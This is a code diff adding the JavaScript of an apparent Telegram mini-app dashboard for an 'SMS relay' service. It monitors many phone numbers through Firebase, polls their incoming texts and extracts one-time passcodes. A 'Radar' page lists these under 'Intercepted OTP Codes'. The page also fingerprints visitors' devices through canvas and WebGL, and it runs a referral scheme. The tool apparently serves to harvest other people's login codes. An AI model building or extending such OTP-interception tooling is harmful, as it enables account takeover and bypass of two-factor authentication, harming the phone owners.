+// ── Loading / empty helpers ───────────────────────────────────
+function loadingHTML() { return '<div class="loading"><div class="spinner"></div>Syncing from Firebase...</div>'; }
+function emptyHTML(msg) { return `<div class="empty">◌<br>${msg}</div>`; }
+
+// ══════════════════════════════════════════════════════════════
+// PAGE RENDERERS
+// ══════════════════════════════════════════════════════════════
+async function loadPage(page) {
+  const fn = { dash: loadDash, nodes: loadNodes, radar: loadRadar, network: loadNetwork, guard: loadGuard }[page];
+  if (fn) fn();
+}
+
+// ── DASH ─────────────────────────────────────────────────────
+async function loadDash() {
+  const el = document.getElementById('page-dash');
+
+  const hot      = numbers.filter(n => tier(n) === 'hot').length;
+  const standby  = numbers.filter(n => tier(n) === 'standby').length;
+  const offline  = numbers.filter(n => tier(n) === 'offline').length;
+  const allOTP   = loadedSMS.filter(s => s.otp).length;
+  const ghosts   = numbers.filter(n => n.is_ghost).length;
+
+  el.innerHTML = `
+    ${configBanner()}
+    <div class="page-title">
+      <span class="page-title-text">System Overview</span>
+      <span class="page-title-meta">${new Date().toLocaleTimeString()}</span>
+    </div>
+    <div class="g2">
+      <div class="card">
+        <div class="card-label">Hot Lines</div>
+        <div class="card-value" style="color:var(--green)">${hot}</div>
+        <div class="card-sub">of ${numbers.length} total</div>
+      </div>
+      <div class="card">
+        <div class="card-label">OTP Captured</div>
+        <div class="card-value" style="color:var(--amber)">${allOTP}</div>
+        <div class="card-sub">this session</div>
+      </div>
+    </div>
+    <div class="g3">
+      <div class="card"><div class="card-label">Standby</div><div class="card-value" style="font-size:20px;color:var(--amber)">${standby}</div></div>
+      <div class="card"><div class="card-label">Offline</div><div class="card-value" style="font-size:20px;color:var(--dim)">${offline}</div></div>
+      <div class="card"><div class="card-label">Ghost</div><div class="card-value" style="font-size:20px;color:var(--purple)">${ghosts}</div></div>
+    </div>
+    <div class="section-lbl">Live SMS Feed</div>
+    <div id="d-feed">${numbers.length === 0 && isConfigured ? loadingHTML() : ''}</div>
+  `;
+
+  // Latest SMS across all loaded numbers (from session cache)
+  const feed = [...loadedSMS].sort((a, b) => b.ts - a.ts).slice(0, 15);
+  renderFeed('d-feed', feed, null);
+}
+
+function renderFeed(targetId, items, phone) {
+  const el = document.getElementById(targetId);
+  if (!el) return;
+  if (!items || items.length === 0) { el.innerHTML = emptyHTML('No messages yet'); return; }
+  el.innerHTML = items.map(s => `
+    <div class="sms-item${s.otp ? ' otp' : ''}">
+      <div class="sms-item-hdr">
+        <span class="sms-phone">${phone || s.phone || ''}</span>
+        <span class="sms-time">${fmtTime(s.ts || s.key)}</span>
+      </div>
+      <div class="sms-from">From: ${s.sender}</div>
+      <div class="sms-body">${escHtml(s.body)}</div>
+      ${s.otp ? `<span class="otp-badge">OTP: ${s.otp}</span>` : ''}
+    </div>
+  `).join('');
+}
+
+function escHtml(s) {
+  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ── NODES ────────────────────────────────────────────────────
+let nodesFilter = 'all';
+
+async function loadNodes() {
+  const el = document.getElementById('page-nodes');
+  el.innerHTML = `
+    ${configBanner()}
+    <div class="page-title">
+      <span class="page-title-text">Number Nodes</span>
+      <span class="page-title-meta" id="nodes-count">${numbers.length} numbers</span>
+    </div>
+    <div class="chips">
+      <button class="chip ${nodesFilter==='all'?'on':''}"     onclick="setFilter('all',this)">All</button>
+      <button class="chip ${nodesFilter==='hot'?'on':''}"     onclick="setFilter('hot',this)">🔴 Hot</button>
+      <button class="chip ${nodesFilter==='standby'?'on':''}" onclick="setFilter('standby',this)">🟡 Standby</button>
+      <button class="chip ${nodesFilter==='offline'?'on':''}" onclick="setFilter('offline',this)">⚫ Offline</button>
+      <button class="chip ${nodesFilter==='ghost'?'on':''}"   onclick="setFilter('ghost',this)">👻 Ghost</button>
+    </div>
+    <div id="nodes-list">${numbers.length === 0 && isConfigured ? loadingHTML() : ''}</div>
+  `;
+
+  let filtered = numbers;
+  if (nodesFilter === 'hot')     filtered = numbers.filter(n => tier(n) === 'hot');
+  else if (nodesFilter === 'standby') filtered = numbers.filter(n => tier(n) === 'standby');
+  else if (nodesFilter === 'offline') filtered = numbers.filter(n => tier(n) === 'offline' || n.status === 'Inactive');
+  else if (nodesFilter === 'ghost')   filtered = numbers.filter(n => n.is_ghost);
+
+  document.getElementById('nodes-count').textContent = `${filtered.length} / ${numbers.length}`;
+
+  const listEl = document.getElementById('nodes-list');
+  if (!filtered.length) {
+    listEl.innerHTML = emptyHTML(isConfigured ? 'No numbers match filter' : 'Configure Firebase to load numbers');
+    return;
+  }
+
+  listEl.innerHTML = filtered.map((n, i) => {
+    const t = tier(n);
+    const dotCls = t === 'hot' ? 'hot' : t === 'standby' ? 'standby' : 'offline';
+    const lastSeen = n.last_sms_ts ? fmtDate(n.last_sms_ts) : 'No SMS';
+    return `
+      <div class="num-item" onclick="openMonitor(${numbers.indexOf(n)})">
+        <div class="status-dot ${dotCls}"></div>
+        <div class="num-info">
+          <div class="num-phone">${n.number}${n.is_ghost ? ' 👻' : ''}</div>
+          <div class="num-meta">${n.device_name} · ${n.struct_type} · ${lastSeen}</div>
+        </div>
+        <div class="num-arrow">›</div>
+      </div>
+    `;
+  }).join('');
+}
+
+function setFilter(f, btn) {
+  nodesFilter = f;
+  document.querySelectorAll('#page-nodes .chip').forEach(c => c.classList.remove('on'));
+  if (btn) btn.classList.add('on');
+  loadNodes();
+}
+
+// ── SMS MONITOR ───────────────────────────────────────────────
+async function openMonitor(idx) {
+  monitorNumber = numbers[idx];
+  if (!monitorNumber) return;
+
+  document.getElementById('sms-monitor').classList.remove('hidden');
+  document.getElementById('mon-phone').textContent = monitorNumber.number;
+  document.getElementById('mon-sub').textContent = `Path: ${monitorNumber.sms_path} · [${monitorNumber.struct_type}]`;
+  document.getElementById('mon-body').innerHTML = loadingHTML();
+
+  await pollMonitor();
+  if (monitorTimer) clearInterval(monitorTimer);
+  monitorTimer = setInterval(pollMonitor, 5000);
+}
+
+async function pollMonitor() {
+  if (!monitorNumber) return;
+  const items = await fetchSMSForPath(monitorNumber.sms_path, 30);
+
+  // Cache into loadedSMS for radar/dash
+  for (const sms of items) {
+    const fp = monitorNumber.number + '|' + sms.sender + '|' + sms.body.slice(0, 30) + '|' + sms.ts;
+    if (!loadedSMS.find(s => s._fp === fp)) {
+      loadedSMS.unshift({ ...sms, phone: monitorNumber.number, _fp: fp });
+      if (loadedSMS.length > 200) loadedSMS.pop();
+    }
+  }
+
+  const el = document.getElementById('mon-body');
+  if (!el) return;
+  if (!items.length) {
+    el.innerHTML = emptyHTML('No SMS found at this path yet');
+    return;
+  }
+  el.innerHTML = items.map(s => `
+    <div class="sms-item${s.otp ? ' otp' : ''}">
+      <div class="sms-item-hdr">
+        <span class="sms-phone">${monitorNumber.number}</span>
+        <span class="sms-time">${fmtTime(s.ts || s.key)}</span>
+      </div>
+      <div class="sms-from">From: ${s.sender}</div>
+      <div class="sms-body">${escHtml(s.body)}</div>
+      ${s.otp ? `<span class="otp-badge">🔑 OTP: ${s.otp}</span>` : ''}
+    </div>
+  `).join('');
+}
+
+function closeMonitor() {
+  document.getElementById('sms-monitor').classList.add('hidden');
+  if (monitorTimer) { clearInterval(monitorTimer); monitorTimer = null; }
+  monitorNumber = null;
+}
+
+// ── RADAR ─────────────────────────────────────────────────────
+async function loadRadar() {
+  const el = document.getElementById('page-radar');
+  const otp = loadedSMS.filter(s => s.otp);
+  const rate = loadedSMS.length ? Math.round(otp.length / loadedSMS.length * 100) : 0;
+
+  const counts = {};
+  loadedSMS.forEach(s => { counts[s.sender] = (counts[s.sender] || 0) + 1; });
+  const top = Object.entries(counts).sort((a, b) => b[1] - a[1]).slice(0, 7);
+  const max = top[0]?.[1] || 1;
+
+  el.innerHTML = `
+    ${configBanner()}
+    <div class="page-title">
+      <span class="page-title-text">OTP Radar</span>
+      <span class="page-title-meta">${rate}% detection rate</span>
+    </div>
+    <div class="g2">
+      <div class="card">
+        <div class="card-label">OTP Captured</div>
+        <div class="card-value" style="color:var(--amber)">${otp.length}</div>
+        <div class="card-sub">of ${loadedSMS.length} SMS loaded</div>
+      </div>
+      <div class="card">
+        <div class="card-label">OTP Rate</div>
+        <div class="card-value" style="color:var(--amber)">${rate}%</div>
+        <div class="card-sub">session average</div>
+      </div>
+    </div>
+
+    <div class="section-lbl">Signal Map</div>
+    <div class="radar-wrap">
+      <div class="radar-ring" style="inset:0"></div>
+      <div class="radar-ring" style="inset:20%"></div>
+      <div class="radar-ring" style="inset:40%"></div>
+      <div class="radar-sweep"></div>
+      <div class="radar-blip" style="top:28%;left:62%;animation-delay:0.8s"></div>
+      <div class="radar-blip" style="top:58%;left:25%;animation-delay:1.6s"></div>
+      <div class="radar-blip" style="top:70%;left:65%;animation-delay:0.3s"></div>
+      <div class="radar-blip" style="top:35%;left:40%;animation-delay:2.1s"></div>
+      <div class="radar-center"></div>
+    </div>
+
+    <div class="section-lbl">Top Senders</div>
+    <div id="r-senders">
+      ${top.length ? top.map(([s, c]) => `
+        <div class="bar-row">
+          <div class="bar-hdr"><span class="bar-lbl">${escHtml(s)}</span><span class="bar-cnt">${c}</span></div>
+          <div class="bar-track"><div class="bar-fill" style="width:${c/max*100}%;background:var(--amber)"></div></div>
+        </div>
+      `).join('') : emptyHTML('Monitor a number to see senders')}
+    </div>
+
+    <div class="section-lbl">Intercepted OTP Codes</div>
+    <div>
+      ${otp.length ? otp.slice(0, 15).map(s => `
+        <div class="otp-code-item">
+          <div>
+            <div class="otp-number">${s.otp}</div>
+            <span class="otp-badge">INTERCEPTED</span>
+          </div>
+          <div class="otp-meta">
+            <div class="otp-from">${escHtml(s.sender)}</div>
+            <div class="otp-time">${fmtTime(s.ts)}</div>
+          </div>
+        </div>
+      `).join('') : emptyHTML('No OTP codes detected yet — open a number to monitor')}
+    </div>
+  `;
+}
+
+// ── NETWORK (Referral) ────────────────────────────────────────
+async function loadNetwork() {
+  const el = document.getElementById('page-network');
+  const refCode = 'REF' + TG_ID;
+  const refLink = `https://t.me/${BOT_USERNAME}?start=ref_${TG_ID}`;
+
+  el.innerHTML = `
+    <div class="page-title"><span class="page-title-text">Referral Network</span></div>
+    <div class="ref-box">
+      <div class="card-label" style="margin-bottom:8px">Your Referral Code</div>
+      <div class="ref-code">${refCode}</div>
+      <div class="ref-link">${refLink}</div>
+    </div>
+    <button class="btn" onclick="copyLink('${refLink}', this)">Copy Referral Link</button>
+    <div class="card">
+      <div class="card-label" style="margin-bottom:10px">Your Identity</div>
+      <div class="stat-row"><span class="stat-key">Telegram ID</span><span class="stat-val" style="color:var(--cyan)">${TG_ID}</span></div>
+      <div class="stat-row"><span class="stat-key">Name</span><span class="stat-val">${escHtml(TG_NAME)}</span></div>
+      ${TG_USERNAME ? `<div class="stat-row"><span class="stat-key">Username</span><span class="stat-val">@${escHtml(TG_USERNAME)}</span></div>` : ''}
+    </div>
+    <div class="section-lbl">How It Works</div>
+    <div class="card">
+      <div class="device-block">
+        <strong>Step 1</strong> — Share your referral link<br>
+        <strong>Step 2</strong> — New user opens bot via your link<br>
+        <strong>Step 3</strong> — Device fingerprint blocks duplicates<br>
+        <strong>Step 4</strong> — Verified referral credited automatically<br><br>
+        <span style="color:var(--amber)">⚠ Each device can only claim one referral.</span>
+      </div>
+    </div>
+  `;
+}
+
+function copyLink(url, btn) {
+  navigator.clipboard.writeText(url).then(() => {
+    btn.textContent = '✓ Copied!';
+    setTimeout(() => btn.textContent = 'Copy Referral Link', 2000);
+  }).catch(() => showToast('Copy failed', true));
+}
+
+// ── GUARD (Device) ────────────────────────────────────────────
+async function loadGuard() {
+  const el = document.getElementById('page-guard');
+  el.innerHTML = '<div class="loading"><div class="spinner"></div>Running device scan...</div>';
+
+  const tz      = Intl.DateTimeFormat().resolvedOptions().timeZone;
+  const scrStr  = `${screen.width}×${screen.height}@${window.devicePixelRatio}x`;
+  const platform = navigator.userAgent.includes('Android') ? 'Android'
+                 : navigator.userAgent.includes('iPhone')  ? 'iOS' : 'Desktop';
+
+  let fp = '';
+  try {
+    const parts = [];
+    try {
+      const cv = document.createElement('canvas');
+      cv.width = 200; cv.height = 50;
+      const ctx = cv.getContext('2d');
+      ctx.fillStyle = '#06080f'; ctx.fillRect(0,0,200,50);
+      ctx.fillStyle = '#00fff0'; ctx.font = '16px Arial';
+      ctx.fillText('SMS_RELAY_GUARD', 10, 34);
+      parts.push(cv.toDataURL());
+    } catch {}
+    try {
+      const gl = document.createElement('canvas').getContext('webgl');
+      if (gl) {
+        const ext = gl.getExtension('WEBGL_debug_renderer_info');
+        if (ext) {
+          parts.push(gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
+          parts.push(gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
+        }
+      }
+    } catch {}
+    parts.push(scrStr, tz, navigator.language, String(navigator.hardwareConcurrency), navigator.userAgent);
+    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(parts.join('|||')));
+    fp = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
+  } catch {}
+
+  const shortFp = fp ? fp.slice(0,8) + '...' + fp.slice(-8) : '???';
+  const isNew   = !localStorage.getItem('_sro_fp');
+  if (fp) localStorage.setItem('_sro_fp', fp);
+
+  el.innerHTML = `
+    <div class="page-title"><span class="page-title-text">Device Guard</span></div>
+    <div class="card">
+      <div class="card-label">Your Device</div>
+      <div class="status-pill ok">✓ Verified</div>
+      <div class="device-block">
+        <strong>Fingerprint:</strong> ${shortFp}<br>
+        <strong>Timezone:</strong> ${tz}<br>
+        <strong>Screen:</strong> ${scrStr}<br>
+        <strong>Platform:</strong> ${platform}<br>
+        <strong>Language:</strong> ${navigator.language}<br>
+        <strong>Cores:</strong> ${navigator.hardwareConcurrency || '?'}<br>
+        <strong>Session:</strong> ${isNew ? 'First visit' : 'Returning device'}
+      </div>
+    </div>
+    <div class="section-lbl">Firebase Connection</div>
+    <div class="card">
+      <div class="stat-row"><span class="stat-key">Firebase URL</span><span class="stat-val" style="font-size:9px;color:${isConfigured?'var(--green)':'var(--red)'}">${isConfigured ? '✓ Configured' : '✗ Not set'}</span></div>
+      <div class="stat-row"><span class="stat-key">Auth Key</span><span class="stat-val" style="color:${FIREBASE_API_KEY?'var(--green)':'var(--amber)'}">
+        ${FIREBASE_API_KEY ? '✓ Set' : '⚠ None (public mode)'}
+      </span></div>
+      <div class="stat-row"><span class="stat-key">Numbers Loaded</span><span class="stat-val" style="color:var(--cyan)">${numbers.length}</span></div>
+      <div class="stat-row"><span class="stat-key">SMS Session</span><span class="stat-val" style="color:var(--cyan)">${loadedSMS.length}</span></div>
+      <div class="stat-row"><span class="stat-key">Anti-fraud</span><span class="stat-val" style="color:var(--green)">Active</span></div>
+    </div>
+    <div class="section-lbl">Telegram</div>
+    <div class="card">
+      <div class="stat-row"><span class="stat-key">User ID</span><span class="stat-val">${TG_ID}</span></div>
+      <div class="stat-row"><span class="stat-key">Name</span><span class="stat-val">${escHtml(TG_NAME)}</span></div>
+    </div>
+  `;
+}
+
+// ── Initial boot ─────────────────────────────────────────────
+(async () => {
+  loadDash();
+  if (isConfigured) {
+    await loadNumbers();
+    loadDash();  // re-render with counts
+  }
+})();
+</script>
+</body>
+</html>
